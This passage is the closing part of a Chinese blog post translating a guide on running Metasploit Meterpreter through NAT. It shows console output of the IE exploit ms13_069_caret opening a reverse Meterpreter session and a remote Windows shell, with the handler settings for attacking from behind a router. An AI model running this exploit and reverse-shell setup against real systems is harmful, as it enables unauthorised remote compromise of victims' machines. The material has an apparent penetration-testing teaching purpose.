+<p>如果我们现在在靶机上使用IE8(来自IECollection)并连接到攻击端路由器/防火墙的公网IP的80端口，我们应该看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(ms13_069_caret) &gt; [*] 2.2.2.2   ms13_069_caret - Sending exploit...</span><br><span class="line">[*] 2.2.2.2   ms13_069_caret - Sending exploit...</span><br><span class="line">[*] 2.2.2.2:53893 Request received for /NtFT...</span><br><span class="line">[*] 2.2.2.2:53893 Staging connection for target /NtFT received...</span><br><span class="line">[*] Patched user-agent at offset 663128...</span><br><span class="line">[*] Patched transport at offset 662792...</span><br><span class="line">[*] Patched URL at offset 662856...</span><br><span class="line">[*] Patched Expiration Timeout at offset 663728...</span><br><span class="line">[*] Patched Communication Timeout at offset 663732...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.187:443 -&gt; 2.2.2.2:53893) at 2014-01-05 09:24:26 +0100</span><br><span class="line">[*] Session ID 1 (192.168.0.187:443 -&gt; 2.2.2.2:53893) processing InitialAutoRunScript &apos;migrate -f&apos;</span><br><span class="line">[*] Current server process: iexplore.exe (2952)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 500</span><br><span class="line">[+] Successfully migrated to process </span><br><span class="line"></span><br><span class="line">msf exploit(ms13_069_caret) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 592 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\peter\Desktop&gt;</span><br></pre></td></tr></table></figure></p>
+<p>2.2.2.2是靶机的公网IP。当靶机连接到端口80时，Metasploit正在发送有效载荷，利用浏览器并执行初始的meterpreter有效载荷。此有效负载将下载metsrv.dll（首先由Metasploit生成，因此它将包含攻击者的公网IP和端口），将其加载到内存中（使用反射负载）并运行代码。完成后，您将获得一个完整的Meterpreter会话。Life is good.  </p>
+<p>所以，简而言之，你应该设置以下变量：  </p>
+<ul>
+<li>SRVHOST：0.0.0.0</li>
+<li>SRVPORT：设置为您要使用的浏览器exp的端口</li>
+<li>LHOST：攻击机的公网IP</li>
+<li>LPORT：设置为要为Meterpreter处理程序连接的端口</li>
+<li>ReverseListenerBindAddress：LANIP （可选）</li>
+</ul>
+<p>无论出于何种原因，如果您还希望在另一个端口上托管Meterpreter处理程序而不是客户端将连接到的端口，那么您可以使用LPORT指定目标将连接回的位置，并使用ReverseListenerBindPort指示处理程序侦听的位置。显然，您需要确保端口转发将连接到攻击机上的正确端口。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/04/代码审计入门-BEESCMS4.0/" rel="next" title="代码审计入门-BEESCMS4.0">
+                <i class="fa fa-chevron-left"></i> 代码审计入门-BEESCMS4.0
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="tusk1">
+            
+              <p class="site-author-name" itemprop="name">tusk1</p>
+              <p class="site-description motion-element" itemprop="description">奋斗、寻觅，而不屈服</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1592129863&website=www.oicqzone.com" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-globe"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1592129863@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#翻译：Metasploit-Meterpreter-and-NAT"><span class="nav-number">1.</span> <span class="nav-text">翻译：Metasploit Meterpreter and NAT</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#引言"><span class="nav-number">1.1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络配置"><span class="nav-number">1.2.</span> <span class="nav-text">网络配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#在攻击端设置转发"><span class="nav-number">1.3.</span> <span class="nav-text">在攻击端设置转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit配置"><span class="nav-number">1.4.</span> <span class="nav-text">Metasploit配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#浏览器漏洞利用-meterpreter-reverse-https"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">浏览器漏洞利用 - meterpreter / reverse_https</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">tusk1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
